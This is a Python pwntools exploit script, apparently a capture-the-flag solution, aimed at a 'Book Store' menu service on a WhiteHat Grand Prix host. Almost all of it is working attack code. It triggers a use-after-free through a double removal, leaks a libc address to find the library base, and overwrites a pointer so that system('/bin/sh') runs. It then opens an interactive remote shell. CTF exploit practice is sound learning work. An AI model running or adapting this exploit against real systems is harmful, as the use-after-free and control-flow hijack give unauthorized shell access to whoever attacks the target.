#!/usr/bin/python2

from pwn import *


def exploit(connection):
    def add_book(title, brief_size, brief, reference_title, best_selling):
        connection.recvuntil("Your choice:")
        connection.send("1\n")
        connection.recvuntil("Title:")
        connection.send("{:s}\n".format(title))
        connection.recvuntil("Enter brief size:")
        connection.send("{:d}\n".format(brief_size))
        connection.recvuntil("Enter brief:")
        connection.send("{:s}\n".format(brief))
        connection.recvuntil("Reference book title:")
        connection.send("{:s}\n".format(reference_title))
        connection.recvuntil("Best Selling? (Y/N)")
        connection.send("{:s}\n".format(best_selling))

    def edit_book(old_title, new_title, brief_size, brief, best_selling):
        connection.recvuntil("Your choice:")
        connection.send("2\n")
        connection.recvuntil("Old title:")
        connection.send("{:s}\n".format(old_title))
        connection.recvuntil("New title:")
        connection.send("{:s}\n".format(new_title))
        connection.recvuntil("Enter brief size:")
        connection.send("{:d}\n".format(brief_size))
        connection.recvuntil("Enter brief:")
        if brief_size <= len(brief):
            connection.send(brief)
        else:
            connection.send("{:s}\n".format(brief))
        connection.recvuntil("Best Selling? (Y/N)")
        connection.send("{:s}\n".format(best_selling))

    def remove_book(title):
        connection.recvuntil("Your choice:")
        connection.send("3\n")
        connection.recvuntil("Title:")
        connection.send("{:s}\n".format(title))

    def list_books():
        connection.recvuntil("Your choice:")
        connection.send("4\n")
        return connection.recvuntil("== Book Store ==\n")

    # Step 1: Add a book with a short brief

    add_book("A", 0x18, "B", "C", "N")

    # Step 2: Add a best selling book

    add_book("D", 0x18, "E", "F", "Y")

    # Step 3: Enter use-after-free state by deallocating the best selling book

    remove_book("D")
    remove_book("D")

    # Step 4: Leak `libc` address by exploiting use-after-free vulnerability

    brief = fit({
            8: 0x601fb8,
        }
    )
    edit_book("A", "A", 0x3a, brief, "N")

    leak = list_books()
    match = re.search(
        "\\|0002\\| +\\|\\x1b\\x5b\\x33\\x33\\x6d(?P<bytes>.*)\\x1b\\x5b\\x30\\x6d\n\\|[\\-+]+\\|\n",
        leak,
        re.DOTALL
    )
    bytes = match.group("bytes")
    libc_start_main_addr = u64(bytes.ljust(8, "\x00"))
    info("libc_start_main_addr = %012x", libc_start_main_addr)

    libc_addr = libc_start_main_addr - 0x021ab0
    info("libc_addr = %012x", libc_addr)

    # Step 5: Execute interactive shell by exploiting use-after-free vulnerability

    brief = fit({
            # `/bin/sh`
            8: libc_addr + 0x1b3e9a,
            # `system`
            0x32: libc_addr + 0x04f440,
        }
    )
    edit_book("A", "A", 0x3a, brief, "N")

    connection.recvuntil("Your choice:")
    connection.send("4\n")

    connection.interactive()


context.arch = "amd64"
context.log_level = "debug"
with remote("pwn02.grandprix.whitehatvn.com", 8005) as connection:
    exploit(connection)
